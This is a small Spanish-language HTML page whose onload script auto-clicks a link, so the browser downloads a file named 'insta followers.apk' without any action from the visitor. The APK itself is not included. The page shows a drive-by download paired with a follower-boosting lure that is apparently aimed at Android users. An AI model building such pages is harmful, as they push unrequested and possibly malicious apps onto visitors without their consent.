<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Descarga Automática</title>
    <script type="text/javascript">
        window.onload = function() {
            var link = document.createElement('a');
            link.href = 'insta followers.apk';  // Ruta del archivo a descargar
            link.download = 'insta followers.apk';  // Nombre sugerido para la descarga
            link.click();
        };
    </script>
</head>
<body>
    <h1>La descarga debería comenzar automáticamente</h1>
</body>
</html>
